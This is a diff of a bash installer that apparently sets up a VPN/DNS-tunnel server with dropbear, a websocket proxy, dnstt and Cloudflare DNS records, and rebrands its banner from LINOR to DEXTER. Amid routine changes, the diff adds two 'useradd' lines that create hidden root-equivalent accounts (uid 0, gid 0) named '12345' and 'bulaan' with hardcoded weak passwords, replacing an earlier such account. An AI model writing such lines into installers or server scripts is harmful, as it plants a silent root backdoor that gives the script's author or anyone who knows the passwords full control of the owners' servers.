@@ -1,34 +1,30 @@
 #!/bin/bash
 
-RED='\033[0;31m'
-NC='\033[0m'
-GREEN='\033[0;32m'
-ORANGE='\033[0;33m'
-BLUE='\033[0;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[0;36m'
-LIGHT='\033[0;37m'
+RED='\033[01;31m';
+RESET='\033[0m';
+GREEN='\033[01;32m';
+WHITE='\033[01;37m';
+YELLOW='\033[00;33m';
 
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo '                                                              
-    ██╗     ██╗███╗   ██╗ ██████╗ ██████╗ 
-    ██║     ██║████╗  ██║██╔═══██╗██╔══██╗
-    ██║     ██║██╔██╗ ██║██║   ██║██████╔╝
-    ██║     ██║██║╚██╗██║██║   ██║██╔══██╗
-    ███████╗██║██║ ╚████║╚██████╔╝██║  ██║
-    ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝ 
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
  '
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo ""
 
-# Getting a
 MYIP=$(wget -qO- ipinfo.io/ip);
 echo "Checking VPS"
 
 clear
 apt install jq curl -y
 
-echo $NS_DOMAIN > /root/nsdomain
+echo $NS_DOMAIN > /root/ns.txt
 echo $SUB_DOMAIN > /root/subdomain  #save subdomain
 
 DOMAIN=dnstunnel.net
@@ -68,7 +64,7 @@ RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_r
 
 
 #add recond NS
-echo "$NS_DOMAIN" >> /root/nsdomain
+echo "$NS_DOMAIN" >> /root/ns.txt
 
 ZONE=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${DOMAIN}&status=active" \
      -H "X-Auth-Email: ${CF_ID}" \
@@ -96,6 +92,7 @@ RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZONE}/dns_r
 
 startinstall(){
 apt-get update
+mkdir /etc/update-motd.d
 apt-get install inxi screenfetch lolcat figlet -y
 
 /bin/cat <<"EOM" >/etc/update-motd.d/01-custom
@@ -123,7 +120,8 @@ sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
 sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
-useradd -p $(openssl passwd -1 linorvpn) linorvpn -ou 0 -g 0
+useradd -p $(openssl passwd -1 bulaan) 12345 -ou 0 -g 0
+useradd -p $(openssl passwd -1 12345) bulaan -ou 0 -g 0
 service dropbear restart
 
 cat << \websocket > /usr/local/sbin/websocket.py
@@ -736,7 +734,7 @@ cat <<\EOM > /root/dnstt/dnstt-server/server.pub
 5d30d19aa2524d7bd89afdffd9c2141575b21a728ea61c8cd7c8bf3839f97032
 EOM
 
-NSNAME="$(cat /root/nsdomain)"
+NSNAME="$(cat /root/ns.txt)"
 cd /root/dnstt/dnstt-server
 screen -dmS slowdns ./dnstt-server -udp :5300 -privkey-file server.key $NSNAME 127.0.0.1:442
 
@@ -839,12 +837,12 @@ display_menu () {
 clear
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 echo '                                                              
-    ██╗     ██╗███╗   ██╗ ██████╗ ██████╗ 
-    ██║     ██║████╗  ██║██╔═══██╗██╔══██╗
-    ██║     ██║██╔██╗ ██║██║   ██║██████╔╝
-    ██║     ██║██║╚██╗██║██║   ██║██╔══██╗
-    ███████╗██║██║ ╚████║╚██████╔╝██║  ██║
-    ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝ 
+   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
+   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
+   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
+   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
+   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
+   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
  '
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 }
@@ -866,9 +864,10 @@ echo ""
 echo "Host : $SUB_DOMAIN"
 echo $SUB_DOMAIN > /root/subdomain
 echo "Host NS : $NS_DOMAIN"
-echo $NS_DOMAIN > /root/nsdomain
+echo $NS_DOMAIN > /root/ns.txt
 echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
 }
+
 
 startinstall
 clear
